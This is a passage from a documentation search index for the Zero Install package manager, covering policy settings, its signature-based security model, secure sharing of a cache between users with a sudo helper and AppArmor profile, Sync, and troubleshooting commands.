from the Applications menu, click on the edit properties icon next to an application and click Preferences.</p> <p></p> <p>You can change the policy settings using the Configuration dialog.</p> <p>To open it run <code>0install-win config</code> or click on the Options in the bottom left of the main GUI.</p> <p></p>"},{"location":"details/policy-settings/#network-use","title":"Network use","text":"<p>Affects how much 0install will rely on the network. Possible values are:</p> Value Effect Full Normal network use. Minimal 0install will prefer cached versions over non-cached ones. Off-line 0install will not use the network."},{"location":"details/policy-settings/#freshness","title":"Freshness","text":"<p>0install caches feeds and checks for updates from time to time. The freshness indicates how old a feed may get before 0install automatically checks for updates to it. Note that 0install only checks for updates when you actually run a program; so if you never run something, it won't waste time checking for updates.</p>"},{"location":"details/policy-settings/#help-test-new-versions","title":"Help test new versions","text":"<p>By default, 0install tries not to select new versions while they're still in the \"testing\" phase. If checked, 0install will instead always select the newest version, even if it's marked as \"testing\".</p>"},{"location":"details/policy-settings/#per-application-policy-settings","title":"Per-application policy settings","text":"<p>You can change per-application policy settings in the application information dialog. To open this dialog:</p> LinuxWindows <ol> <li> <p>Run <code>0install run</code> with the <code>--gui</code> option and the URI of the application:     <pre><code>0install run --gui http://rox.sourceforge.net/2005/interfaces/Edit\n</code></pre></p> <p>-or-</p> <p>Choose Zero Install -&gt; Manage Applications from the Applications menu, click on the edit properties icon next to the application. </p> </li> <li> <p>Double-click the application in the list. For example, double-clicking on Edit displays this dialog box: </p> </li> </ol> <ol> <li> <p>Run <code>0install run</code> with the <code>--customize</code> option and the URI of the application:     <pre><code>0install run --customize https://apps.0install.net/gui/vlc.xml\n</code></pre></p> <p>-or-</p> <p>In the main GUI open the dropdown menu next to an App's Run button, select Run with options, set the Customize version checkbox and click OK. </p> </li> <li> <p>Click on the Change link next to the application. This displays this dialog box: </p> </li> </ol>"},{"location":"details/policy-settings/#feeds","title":"Feeds","text":"<p>In the Feeds tab, a list of feeds shows all the places where Zero Install looks for versions of the app. By default, there is just one feed with the URL you just entered. You can register additional feeds to be considered (e.g., a local feed with custom builds or an alternate remote feed). This can be done either using the GUI or with the <code>0install add-feed</code> command.</p>"},{"location":"details/policy-settings/#versions","title":"Versions","text":"<p>In the Versions tab, you can use the Preferred Stability setting in the interface dialog to choose which versions to prefer. You can also change the stability rating of any implementation by clicking on it and choosing a new rating from the popup menu (drop-down in the Override column on Windows). User-set ratings are shown in capitals.</p> <p>As you make changes to the policy and ratings, the selected implementation will change. The version shown in bold (or at the top of the list, in some versions) is the one that will actually be used. In addition to the ratings below, you can set the rating to Preferred. Such versions are always preferred above other versions, unless they're not cached and you are in Off-line mode.</p> <p>The following stability ratings are allowed:</p> <ul> <li>Stable (this is the default if Help test new versions is unchecked)</li> <li>Testing (this is the default if Help test new versions is checked)</li> <li>Developer</li> <li>Buggy</li> <li>Insecure</li> </ul> <p>Stability ratings are kept independently of the implementations, and are expected to change over time. When any new release is made, its stability is initially set to Testing. If you have selected Help test new versions in the Preferences dialog box then you will then start using it. Otherwise, you will continue with the previous stable release. After a while (days, weeks or months, depending on the project) with no serious problems found, the author will change the implementation's stability to Stable so that everyone will use it.</p> <p>If problems are found, it will instead be marked as Buggy, or Insecure. Neither will be selected by default, but it is useful to see the reason (you might opt to continue using a buggy version if it works for you, but should never use an insecure one). Developer is like a more extreme version of Testing, where the program is expected to have bugs.</p> <p>Tip</p> <p>If you want to use the second item on the list because the first is buggy, for example, then it is better to mark the first version as buggy than to mark the second as preferred. This is because when a new version is available, you will want that to become the version at the top of the list, whereas a preferred version will always be first.</p>"},{"location":"details/security/","title":"Security","text":"<p>This page describes Zero Install's security model.</p> <p>I've noticed that if you describe a security model with digital signatures and GPG keys, people start worrying about all kinds of unlikely theoretical exploits. Whereas if you just stick software on the web with no security what-so-ever, everyone seems completely happy to use it. But for those few people who do care about security, this document explains how Zero Install tries to improve the situation.</p>"},{"location":"details/security/#overview","title":"Overview","text":"<p>No-one has the time to verify every line of code in every program they use. Yet, we need to use these programs to process our data, and we must guard against the possibility that the code we use is malicious. We need methods to help ensure that we don't allow malicious code to run, to limit the damage it can do if we do run it, and to discover and recover from compromises when they do happen.</p> <p>Some key points about Zero Install's security model:</p> If one user downloads a malicious program, other users aren't affected In traditional systems, installing a program also puts files into shared directories like <code>/usr/bin</code> and <code>/usr/lib</code> under short names. So if one user installs the Gimp from <code>http://evil.com</code> then it might save the executable as <code>/usr/bin/gimp</code>. Another user might run this, thinking it was from http://gimp.org. In a Zero Install system, users specify the full URI of the program they want to run, and the system only shares the copy if they really are the same. The short-cuts (e.g., that \"Run gimp\" means \"Run http://gimp.org/gimp\") are per-user, but the programs themselves are shared. Installation does not execute any downloaded code Most installation systems run code in the downloaded package as part of the installation process. Typically, these scripts are run as root and can do anything they like to the machine. Zero Install merely fetches files into the cache during installation; nothing downloaded is executed and files from different packages cannot conflict (because they each go in their own directory). Digital signatures are always checked before software is run To protect against the possibility of attackers breaking into a web-server and replacing the real software with modified versions, or redirecting network traffic to the real web-server to their own, Zero Install only runs code that is signed by a GPG key you trust to provide software from that web-site. By default, it will automatically approve keys known to the key information server; this can be disabled from the preferences dialog. Security when running programs is your problem Zero Install goes to great lengths to get software on to your machine without letting it do anything dangerous, but what happens next is up to you. On a normal Linux system this still brings some benefits (e.g. users can share programs without also sharing viruses), but the real advantages come when you combine this with some sandboxing technology to restrict what programs can do when running."},{"location":"details/security/#demo","title":"Demo!","text":"<p>For a demonstration of using sandboxing with Zero Install, see ebox.</p>"},{"location":"details/security/#authorisation-vs-privileges","title":"Authorisation vs Privileges","text":"<p>It's also important to separate out two aspects of installation that are easily confused: who is authorised to install software and what privileges the software is given by the act of installing it. Here, \"apt-get\" is used as a short-hard for \"a typical traditional Linux package manager\":</p> Privileges granted Only root can install things Anyone can install things Full access Default apt-get apt-get with modified rules No access Zero Install with restrictions Default Zero Install <p>A typical package manager only allows root (or an administrator) to install software by default, and grants that software full access to the machine, including access to all user accounts. You can change the rules to allow others to install software (e.g. using PolicyKit or sudoers, you might allow anyone to upgrade a package), but the software still gets complete access to the machine.</p> <p>Zero Install allows anyone to install software by default, but gives the software no access to the machine (since it doesn't run any of its code at install time). You could configure Zero Install so that only root can install software, but the software would still get no ability to do anything at install time.</p> <p>The reason we allow anyone to install software by default is the principle of Do Not Prohibit What You Cannot Prevent [citation needed]. On Linux, unprivileged users can install software even without Zero Install, so trying to stop them makes life harder for legitimate users but doesn't improve security.</p>"},{"location":"details/security/#security-and-usability","title":"Security and Usability","text":"<p>Some people think of security and usability as a trade-off, with systems being either easy to use, or secure, but not both. But in fact, security is a necessary part of usability. Some examples:</p> <ul> <li> <p>I used to program on a system which had no memory protection, allowing any process to overwrite any other process's memory. Linux prevents programs from doing this. This makes my life as a programmer easier, not harder, because when a program crashes I know that the problem is in that program and not in some other one.</p> </li> <li> <p>Sometimes, I forget where I saved a file. But, I never need to search <code>/usr</code> in case I accidentally saved my letter there; it can't be there, because my word processor doesn't have permission to save there.</p> </li> <li> <p>People often find their computers are infected with spyware and adware, which slows them down, causes crashes, and redirects them to undesirable web sites. Such a system has poor usability.</p> </li> <li> <p>An artist may find a useful image processing filter on the web. If all this filter can do is read an input image and output a modified one then the artist is more likely to try it (and produce better work). If image filters can seriously damage the system then the artist may have to pass it over; the risk from a malicious filter is too great.</p> </li> <li> <p>Few programs are as easy to run in a restricted environment as the image filter example above; an accounting package needs access to my accounts, for example. Still, with good security we can evaluate lots of possible programs and then only weigh up the risk for the one we choose. Without good security we must evaluate fewer programs, and we are at risk from each one we try.</p> </li> </ul> <p>Good security is therefore vital to a usable system. A usable system must be understandable and predictable; on a system where any action can have any consequence this is not possible.</p> <p>Consider traditional software installation on Linux or Windows. You download some package and execute a script inside it. Imagine that I give you a package in your favourite format (setup.exe, .deb, .rpm, source tarball, etc) and ask you to install it. Assume that your system is functioning correctly; what will happen as a result of installing this program?</p> <ul> <li>Will a new item appear on your Start menu (or equivalent)?</li> <li>Will some other program on your computer stop working as a result of a installing this one?</li> <li>Will a new service be added to your boot sequence?</li> <li>Will your browser's saved passwords be posted to an IRC server and your hard disk reformatted?</li> </ul> <p>The answer, for all the formats listed above, is \"I don't know\". With Zero Install, none of these things can happen without some extra action on your part.</p> <p>Now, Zero Install is not a complete solution to these problems. In particular, it does not stop programs from doing any of these things when run. That problem is for some other project to solve (and there are plenty of people working on this; see Plash or SysTrace for example). But Zero Install already brings benefits without the use of these programs (the effects above which require root access will be blocked), and it is clearly a necessary base on which such technologies can be built. Being able to run software in a sandbox is of limited benefit if it requires full root access to install it first!</p>"},{"location":"details/security/#zero-installs-trust-model","title":"Zero Install's trust model","text":"<p>Sandboxing is used to restrict what code can do. Linux and similar systems come with a simple sandboxing system based on users. The system has a number of users, and each user can run whatever software they please. Ideally, it is not possible for malicious code executed by one user to damage the system or threaten the security of any other user. However, the code can do anything that the user running it is permitted to do (such as delete that user's files, or log the user's keystrokes and send them to another computer).</p> <p>A second approach is to ensure that only software written by trusted individuals is run. This presents two problems: how do we come to trust someone to provide reliable software, and how do we know that a particular program really came from them?</p> <p>The basis of Zero Install's model is the standard multi-user model used by Linux. The principle is that the system's responsibility is to protect users from each other, and to protect the system from the users. If one user (or a program they run) can delete another user's files without permission, then that is a problem with the system's security. However, the system is not responsible for protecting users from themselves; it is up to users to take appropriate measures to prevent the programs they run from damaging their own files, for example.</p> <p>Of course, the system may itself have bugs. Ideally, the system should be upgraded when a problem is found (e.g. in the Linux kernel). However, if users are using sandboxing to protect themselves from the programs they run then this may provide an added layer of protection to the system, assuming the users themselves are not malicious.</p> <p>Users can protect themselves by using additional sandboxes within their own sandboxed user account. A good example of this is User-Mode-Linux, which runs a new Linux system within a single user account of a main Linux system. The user can use the sub-Linux's security features to restrict what applications can do inside it, while the whole sub-Linux system is restricted to the user's permissions within the main Linux system. More light-weight sandboxes include running JavaScript in a web browser, or running Java applications with Java's sandboxing turned on.</p> <p>However, good per-user sandboxing is still more of a long-term goal for Linux than a practical solution for many programs at the moment (but see Plash for a good example of where things are heading). Also, some programs really do need full access to the user's files. For example, a file manager needs to be able to delete the user's files, and an email client needs to be able to read the user's emails and send new ones, so making sure that software is not malicious in the first place is very important.</p> <p>When deciding whether to trust a particular programmer, the user will have to consult external sources. Distributions typically fill this role (recommending certain programs only), and friends, magazines, etc, can provide this information too.</p> <p>A trusted programmer is identified by their GPG key's fingerprint. When the user runs a program, Zero Install downloads the feed and checks that it is signed by someone the user trusts. If not, the user is asked to confirm that they trust the holder of the key to provide software to them:</p> <p></p> <p>Once trusted, Zero Install will accept any feed from the same domain signed by that key.</p> <p>Zero Install updates feeds at the request of the user (clicking the 'Refresh' button), or automatically (monthly, by default) if the user sets their freshness policy to request this. If a program is not used, Zero Install does not check for updates to it.</p> <p>Zero Install does not accept incoming network connections, so even if a malicious key is trusted, the owner must still get the user to download a feed they control.</p>"},{"location":"details/security/#possible-attacks","title":"Possible attacks","text":"<p>To run malicious software on a user's machine, an attacker could:</p> <ul> <li>Publish the software on their own web-page, and convince users to run it, or</li> <li>Cause their software to be run when the user tries to run some other program.</li> </ul> <p>Guarding against the first requires educating users not to run untrusted software (this applies whether using Zero Install or not), sandboxing any software that is run if possible, and advising users that the software is unknown and/or known to be malicious. Organisations may wish to keep their own internal database of programs approved for use within the organisation, and to prevent users from installing programs not on this list.</p> <p>To perform the second attack, the attacker needs to replace a trusted feed file on a server with a compromised version. However, the new file must be signed, and the secret signing key should not be on the server. Therefore, the attacker has two options:</p> <ul> <li>Break into the developer's private machine, get their private GPG key, install a keystroke logger, and get the GPG pass-phrase. Then break into the web server and install a compromised signed feed.</li> <li>Break into the webserver and install a feed signed with their own key (a new key with a new fingerprint, but claiming to belong to the original author), and trick users into accepting it.</li> </ul> <p>The second option is probably easiest. Zero Install currently warns users if they run software signed with an unknown GPG key (we maintain a default database of known keys, but we do not have the resources to verify the owners of the keys). Again, organisations may wish to keep their own white-list of allowed keys.</p> <p>The first option can be made even harder if the developer has a second (non-networked) machine with the GPG key, although not all developers will have a spare machine for this purpose.</p>"},{"location":"details/security/#conclusions","title":"Conclusions","text":"<p>We have discussed the need for security and the differences between traditional software installation systems and Zero Install. While installing software with traditional systems can cause arbitrary changes to your system, Zero Install does not run any of the downloaded code during installation; it merely unpacks files to a new directory.</p> <p>Securing the installation process is not the whole story; software should also be executed in a restricted environment. Several other projects are developing suitable sandboxes. Even without such extra programs, the default security mechanisms built in to Linux provide improvements over traditional installation.</p> <p>Whether we have strong sandboxing or not, it is important to know where software has come from and to only accept digitally signed software. Zero Install maintains a list of trusted keys, and aids the user's decision of whether to trust a key using its database of known keys. The default database provides only low security; organisations may wish to provide their own database and perform real verification checks on authors. Organisations may also wish to prevent users from installing unapproved software at all.</p> <p>An attacker wishing to install malicious software must either trick users into trusting them, or steal a trusted developer's GPG key. This is considerably more secure than most other distribution systems, many of which contain no security at all.</p>"},{"location":"details/servers/","title":"Servers","text":"<p>Zero Install downloads files from several different places.</p> <p>First, it downloads from the author's web-site a list of versions of the application that are available and what other libraries the application requires. Zero Install then downloads information about those libraries too, from their web-sites.</p> <p>These lists are signed by the developer who published them. When you use software from a developer for the first time, Zero Install asks you to confirm that you trust this person's signature. It asks your Key information server for extra information to help you decide.</p> <p>Finally, it chooses an appropriate set of versions and downloads those packages.</p> <p>The Mirror server is used as a backup if the project servers don't respond or return an error.</p> <p></p> <p>See also: Zero Install Sync</p>"},{"location":"details/sharing/","title":"Sharing downloads between users","text":"<p>On systems with multiple users, it would be very inefficient if each user had to download their own copy of each program. Most packaging systems require users to have root access in order to share software (either the root password, or admin access through sudo). However, this is a security risk. Zero Install allows software to be shared automatically and safely between mutually-untrusting users.</p> <p>Note</p> <p>This page is about sharing between users on a single computer. If you want to do peer-to-peer sharing on a LAN, see 0share. If you want to share between virtual machines running on a single host, see virtual machines.</p>"},{"location":"details/sharing/#how-it-works","title":"How it works","text":"<p>A digest is a short value calculated from a (usually much bigger) file. There are various different algorithms that can be used. For example, this command calculates the SHA1 digest of the <code>ls</code> binary:</p> <pre><code>$ sha1sum /bin/ls\n90b703d3d29ef20f3ef711eb38625d618c70c4f6  /bin/ls\n</code></pre> <p>A cryptographic digest (like SHA1) is one where it is believed to be infeasibly difficult to create a different program with the same digest. So, if someone gives you a binary with digest above, you can be sure that it's identical to the version of <code>ls</code> that I'm using.</p> <p>Cryptographic digests are the basis of secure sharing in Zero Install. Here's we'll see an example of how two users (Alice and Bob) can share the ROX-Filer program, even if they don't trust each other.</p> <p></p> <p>First, Alice runs ROX-Filer:</p> <ol> <li>Alice visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file.</li> <li>She decides to run ROX-Filer version 2.5 from this file.</li> <li>The Zero Install software gets the digest for this version (<code>sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2</code>) from the file. It also downloads the package and unpacks it.</li> <li>The software passes the unpacked archive to the privileged helper, which checks the digest and copies the directory to <code>/var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2</code> on Linux or <code>C:\\ProgramData\\0install.net\\implementations\\sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2</code> on Windows (see File locations).</li> <li>ROX-Filer runs.</li> </ol> <p>Later, Bob decides to run it too. The system doesn't need to download a second copy:</p> <ol> <li>Bob visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file.</li> <li>He decides to run ROX-Filer version 2.5 from this file.</li> <li>The Zero Install software gets the digest for this version (<code>sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2</code>) from the file.</li> <li>Zero Install sees that the directory <code>/var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2</code> (or <code>C:\\ProgramData\\0install.net\\...</code>) already exists, so it doesn't download the software again.</li> <li>ROX-Filer runs.</li> </ol> <p>But what if we have a malicious user, Charlie? A new machine arrives, and Charlie decides to install a malicious version of ROX-Filer before anyone else installs a good copy:</p> <ol> <li>Charlie visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file.</li> <li>He decides to use ROX-Filer version 2.5 from this file.</li> <li>The Zero Install software gets the digest for this version (<code>sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2</code>) from the file. It also downloads the package and unpacks it.</li> <li>Charlie modifies the download to do something nasty (or, the download has been tampered with, or Charlie's account has been infected with a virus which modifies it, etc).</li> <li>If Charlie tries to install the result to <code>/var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2</code>, the privileged helper rejects it, because the digest of the directory's contents no longer matches that name.</li> <li>Charlie is forced to install his malicious version as <code>/var/cache/0install.net/implementations/sha1=3ab21d8f410e3a5a863d3a32a152edb31ba42f75</code> instead.</li> </ol> <p>When Alice runs ROX-Filer as before, the software sees that <code>/var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2</code> doesn't exist and downloads a genuine copy as before. When Bob runs ROX-Filer, he will use Alice's version.</p> <p></p> <p>You might be worried that Charlie was able to put malicious code in the shared cache. However, it doesn't matter because other users won't try to run it, since it doesn't have the name they're looking for. Of course, it might not even be malicious: a program that deletes files is malicious if it's called <code>cat</code>, but not if it's called <code>rm</code>. As long as users don't go around running random binaries they find in the cache, they're OK.</p>"},{"location":"details/sharing/#setting-up-sharing","title":"Setting up sharing","text":""},{"location":"details/sharing/#linux","title":"Linux","text":"<p>These instructions require Zero Install version 0.30 or later.</p> <p>The actual code for doing sharing this way is currently experimental and not enabled by default. This section shows how the system administrator (someone with root access) can enable it. It is probably best not to do this in security critical environments yet as we're still working on tightening the security. Feedback welcome.</p> <p>This diagram shows the four processes involved in adding a new package to the system cache. If you have a different environment, you can use a different 'helper' script to integrate it with Zero Install.</p> <p></p> <ol> <li>Install 0install version 0.30 or later.</li> <li>Create a new system user called 'zeroinst' (the Ubuntu package will have done this for you automatically).</li> </ol> <pre><code>## useradd -d /var/cache/0install.net --system zeroinst\n</code></pre> <ol> <li>Create the shared directory, owned by this new user (also done automatically by the Ubuntu package):</li> </ol> <pre><code>## mkdir -p /var/cache/0install.net/implementations\n## chown zeroinst /var/cache/0install.net/implementations\n</code></pre> <ol> <li>Create <code>/usr/local/bin/0store-secure-add-helper</code> with:</li> </ol> <pre><code>#!/bin/sh\nexec sudo -S -u zeroinst /usr/bin/0store-secure-add \"$@\" &lt; /dev/null\n</code></pre> <p>Note</p> <p>The path will be <code>/usr/local/bin/0store-secure-add</code> if you installed from source.</p> <ol> <li>Make your new script readable and executable by everyone:</li> </ol> <pre><code>## chmod a+rx /usr/local/bin/0store-secure-add-helper\n</code></pre> <ol> <li>Use <code>visudo</code> to add these lines to <code>/etc/sudoers</code>:</li> </ol> <pre><code>Defaults&gt;zeroinst env_reset,always_set_home\nALL ALL=(zeroinst) NOPASSWD: /usr/bin/0store-secure-add\n</code></pre> <p>Attention</p> <p>The <code>NOPASSWD</code> line must go at the end of the file, otherwise it is likely to be overridden by later entries. Again, use <code>/usr/local/bin</code> if you installed from source.</p> <p>When <code>launch</code> wants to install a package, it will invoke <code>0store-secure-add-helper</code>. This script uses <code>sudo</code> to run <code>0store-secure-add</code> as the <code>zeroinst</code> user, with a clean environment. No password is required for this.</p>"},{"location":"details/sharing/#apparmor-policy","title":"AppArmor policy","text":"<p>The following AppArmor policy can be used to confine the 0store-secure-add process somewhat. However, the process does need read access everywhere (since it could be copying from anywhere) and write access to the entire cache directory, so this doesn't restrict it much more than it already is due to running as a separate user.</p> <pre><code>#include &lt;tunables/global&gt;\n/usr/bin/0store-secure-add {\n  #include &lt;abstractions/base&gt;\n  #include &lt;abstractions/python&gt;\n\n  /** r,\n  /usr/bin/0store-secure-add mr,\n  /usr/bin/python* ixr,\n  /var/cache/0install.net/implementations/** rw,\n}\n</code></pre>"},{"location":"details/sharing/#windows","title":"Windows","text":"<p>On Windows the shared cache is managed by the Zero Install Store Service. It serves roughly the same role as <code>0store-secure-add</code> on Linux. This service ensures that no user can, intentionally or unintentionally, manipulate the contents of the shared cache. Every user can ask the service to add implementations to the shared cache on their behalf while validating the hash. This way other users only get cached implementations if they request the exact same version with the same hash.</p> <p>The Zero Install Store Service is installed automatically when Zero Install is deployed for all users (machine-wide). Zero Install automatically uses the service when it is available (unless in portable mode) and falls back to the user cache if the service is unavailable.</p> <p>The service uses <code>C:\\ProgramData\\0install.net\\implementations</code> (see File locations) for storing implementations by default. A custom location can be specified in the file <code>C:\\ProgramData\\0install.net\\injector\\implementation-dirs</code>. When using a custom location make sure it is only writeable by <code>SYSTEM</code> and <code>Administrators</code> and readable by <code>Everyone</code>.</p>"},{"location":"details/sharing/#technical-details","title":"Technical details","text":"<p>The normal Zero Install user process communicates with the service using named pipes. The user process is responsible for downloading and extracting archives. It streams the extracted file metadata and contents to the service. The services verifies the manifest digest and writes the files to the disk. See the API docs for more information on this protocol.</p> <p>The service records all write operations and errors in the Windows Event Log.</p>"},{"location":"details/sharing/#questions","title":"Questions","text":"How do users uninstall? <p>Currently, they can't. You (the admin) can delete directories from <code>/var/cache/0install.net/implementations</code> to save space (preferably not while they're being used ;-). Ideally, we should track which users have requested which programs and remove them automatically when no-one wants them anymore.</p> What kind of things need 'tightening'? <p>Several things spring to mind:</p> <ul> <li>What happens if the user changes the directory whilst it's being added? We need to audit <code>0store-secure-add</code>.</li> <li>Denial of service attacks, if one user stores lots of stuff (need quotas).</li> </ul> Why do things still get stored in <code>~/.cache</code> after setting this up? <p>Things you've already installed will remain there. Only new software is added in the system cache. Also, the old <code>sha1</code> algorithm isn't accepted by the helper, so software using that can't go in the shared cache. If you still have problems, try running <code>0install run -vvc URI</code> (to see debug output). Finally, make sure your script is executable!</p>"},{"location":"details/sync/","title":"Sync","text":"<p>Note</p> <p>This is currently only supported in Zero Install for Windows.</p> <p>Zero Install Sync allows you to synchronize your list of applications, desktop integrations and command-line aliases between multiple machines. You either need a free 0install.de user account or you can use your own server.</p>"},{"location":"details/sync/#example","title":"Example","text":"<ul> <li>You download LibreOffice and KeePass on your first PC using Zero Install.</li> <li>Zero Install Sync tells your second computer which applications you installed.</li> <li>Your second computer downloads the same applications automatically.</li> </ul>"},{"location":"details/sync/#technical-details","title":"Technical details","text":"<p>The synchronization algorithm works as follows:</p> <ul> <li>Download existing application list from the server if present and decrypt it.</li> <li>Merge the data from the server into the local application list using a three-way merge.</li> <li>Apply any changes made to the application list to the desktop environment.</li> <li>Encrypt and upload the new application list.</li> <li>Store a copy of the application list locally for use as a baseline for the next merge.</li> </ul> <p>All data is encrypted locally before transmission using AES-128. Therefore the server remains unaware of the actual data being synchronized.</p> <p></p> <p>The communication with the server is handled via a simple REST interface which is documented at https://0install.de/sync/.</p>"},{"location":"details/sync/#custom-server","title":"Custom server","text":"<p>If you want to run your own Sync server you have the following options:</p> <ul> <li>Use our PHP script on your web server.</li> <li>Use an empty directory on a WebDAV server.</li> <li>Use a Windows file share.</li> </ul>"},{"location":"details/sync/#localnetwork-filesystem","title":"Local/network filesystem","text":"<p>You can also use a directory on a local or network filesystem instead of an HTTP server. Simply specify a local or UNC path instead of a URL as the Sync Server in the configuration.</p> <pre><code>0install config sync_server \\\\SomeServer\\0install-sync\n</code></pre>"},{"location":"details/troubleshooting/","title":"Trouble-shooting","text":""},{"location":"details/troubleshooting/#0install-is-not-running-the-latest-version-of-a-program","title":"0install is not running the latest version of a program","text":"<p>Try executing the same command again but with the <code>--refresh</code> option. For example:</p> <pre><code>0install run --refresh https://apps.0install.net/gui/vlc.xml\n</code></pre>"},{"location":"details/troubleshooting/#0install-doesnt-select-any-versions-the-expected-versions","title":"0install doesn't select any versions / the expected versions","text":"<p>If 0install cannot find a compatible set of versions for a program, you may see an error like this:</p> <p></p> <p>Or, if not using the GUI, like this:</p> <pre><code>Can't find all required implementations:\n- https://apps.0install.net/java/swt.xml -&gt; (problem)\n    http://www.serscis.eu/0install/serscis-access-modeller 0.15.1 requires 3.7 &lt;= version\n- https://apps.0install.net/utils/graphviz.xml -&gt; 2.28.0-3.2.3 (package:rpm:graphviz:2.28.0-3.2.3:i586)\n- https://apps.0install.net/java/jre.xml -&gt; 6.18-1.8.7-2 (sha1new=6b7c9f98bd1d8bec5bbb5ddb41271c862c8e8529)\n- https://apps.0install.net/java/iris.xml -&gt; 0.6.0 (sha1new=daf7bfada93ec758baeef1c714f3239ce0a5a462)\n- http://www.serscis.eu/0install/serscis-access-modeller -&gt; 0.15.1 (sha1new=7899dbe75c1c332c4e70f272b2d76026714392a6)\n    User requested 0.10 &lt;= version\n</code></pre> <p>To find the cause, start by double-clicking on \"(problem)\" in the GUI to get the list of available versions for that component. Right-click over the version you think it should have chosen and choose \"Explain this decision\" from the menu:</p> <p></p> <p>In this example, the user requested serscis-access-modeller &gt;= 0.10 and all such versions needed SWT &gt;= 3.7 so there was no possible selection (note: this conflict was invented for the sake of this tutorial). The line \"User requested implementation ...\" shows the version which was selected from the list; the solver was constrained to choose this version.</p> <p>There are several common causes:</p> There is no binary for your platform (e.g. you are using 32-bit Windows, but there are only binaries for 64-bit Linux). In this case, you can use 0install to compile a new binary from source (if source is provided in the feed). See 0compile for details. If no source is provided, you will need to go to the project's web-site and compile manually. The dependency is only provided by distribution packages, and your distribution isn't listed Have a look at the feed's XML (View Page Source in your browser) to see if your distribution package is listed. See Distribution Integration for details. <p>Sometimes, the failure to select a version is due to complex inter-dependencies between components. If a valid set of versions exists, 0install will always find it, but if no valid set exists then it can be hard for it to explain why. Rather that showing a proof that none of the billions of possible combinations is valid, 0install tries to find the best example of a failed selection to show you. It works like this:</p> <ol> <li>When the solve fails, 0install switches to debug mode and runs the solve again.</li> <li>Debug mode adds a fake implementation of each component. This fake version is fully compatible with everything, but less preferable than all the real versions (so it will only be selected if there is no other option).</li> <li>This always results in a \"solution\", but whenever a fake implementation is selected it is reported as \"(problem)\", as shown above.</li> </ol> <p>This is quite good at suggesting where the fault is, but the problem may be elsewhere. For example, if a program has versions available for Python 3 and Python 2, and you only have Python 2, then 0install should select the Python 2 version. But if it can't find any valid selections (because some other library required for the Python 2 version is missing), then it might report that the lack of Python 3 is the issue (when, in fact, that's just one possible way of fixing the problem).</p> <p>To investigate further, you can use the <code>--version-for</code> option to fix the versions of multiple components. For example, to find out why you can't run 0compile 1.1 with 0publish 0.20 and 0install 2.1:</p> <pre><code>$ 0install select -c http://0install.net/2006/interfaces/0compile.xml\n  --version 1.1 \\\n  --version-for http://0install.net/2006/interfaces/0publish 0.20 \\\n  --version-for https://apps.0install.net/0install/0install-python.xml 2.1\nCan't find all required implementations:\n- http://0install.net/2006/interfaces/0compile.xml -&gt; 1.1 (sha1new=5d11d6a774f261b408f3c57dce8819481d842f90)\n    User requested version 1.1\n- http://0install.net/2006/interfaces/0publish -&gt; 0.20 (sha1new=3a62c59321720a1736899dec9ef7deb0b29b7b43)\n    User requested version 0.20\n- https://apps.0install.net/0install/0install-python.xml -&gt; (problem)\n    http://0install.net/2006/interfaces/0compile.xml 1.1 requires 2.1 &lt;= version\n    http://0install.net/2006/interfaces/0publish 0.20 requires version &lt; 1.11-post\n    User requested version 2.1\n    No usable implementations satisfy the restrictions:\n      /home/tal/Projects/zero-install/0install (2.1-post): Incompatible with user-specified requirements\n      sha1new=4f860b217bb94723ad6af9062d25dc7faee6a7ae (2.1): incompatible with restrictions\n      sha1new=3fa607f49966f7eb00682336a4391c78d13a3d8b (2.0): Incompatible with user-specified requirements\n      sha1new=cc7a0dcf44d42714bcf1efd27e8ec1f1810ce7da (1.16): Incompatible with user-specified requirements\n      sha1new=ab6ca6165cd57a1bb95ddf5af9c51cdf325e1db8 (1.15): Incompatible with user-specified requirements\n      ...\n- https://apps.0install.net/python/python.xml -&gt; 2.7.3-4 (package:arch:python2:2.7.3-4:x86_64)\n</code></pre> <p>Here, we can see that 0publish 0.20 requires an old version of 0install, while 0compile 1.1 requires a newer one.</p>"},{"location":"details/troubleshooting/#why-is-this-environment-variable-set","title":"Why is this environment variable set?","text":"<p>When you run a program, each component (library) can ask for certain environment variables to be set (this only affects the program being run, not all programs). If variables are being set incorrectly, you'll need to track down why. e.g.</p> <pre><code>$ sam\nPicked up _JAVA_OPTIONS: -XstartOnFirstThread\nUnrecognized option: -XstartOnFirstThread\nCould not create the Java virtual machine.\n</code></pre> <p>To debug this, ask 0install to output the selections as XML and look for the setting inside it. xmllint is useful to format the XML nicely:</p> <pre><code>$ 0install select --xml sam | xmllint --format - &gt; selections.xml\n</code></pre> <p>(if <code>sam</code> is an old-style alias rather than an app, use <code>alias:sam</code> instead)</p> <p>In this case, we find the <code>selections.xml</code> document contains:</p> <pre><code>  &lt;selection arch=\"MacOSX-x86_64\" version=\"3.6.1\"\n             interface=\"https://apps.0install.net/java/swt.xml\" ...&gt;\n    ...\n    &lt;environment mode=\"prepend\" name=\"_JAVA_OPTIONS\"\n                 separator=\" \" value=\"-XstartOnFirstThread\"/&gt;\n  &lt;/selection&gt;\n</code></pre> <p>This tells us that the OS X implementation of version 3.6.1 of the SWT library requested this setting. To test whether this is the problem, remove the <code>&lt;environment&gt;</code> element and try running it:</p> <pre><code>$ 0install run selections.xml\n</code></pre> <p>Having identified the problem, you can now file a bug report against the SWT feed.</p>"},{"location":"details/troubleshooting/#verbose-logging","title":"Verbose logging","text":"<p>If 0install isn't doing what you expect, run it with logging turned up using either <code>-v</code> (verbose) or <code>-vv</code> (very verbose!). Use <code>-c</code> to prevent it switching to GUI mode too. Eg:</p> <pre><code>$ 0install run -vvc http://rox.sourceforge.net/2005/interfaces/Edit\nINFO:root:Running 0install 1.12 ['http://rox.sourceforge.net/2005/interfaces/Edit']; Python 2.7.3 (default, Aug 26 2012, 11:57:48)\n[GCC 4.7.1]\nINFO:0install:Loading configuration from /home/me/.config/0install.net/injector/global\nDEBUG:0install:Loading cached information for 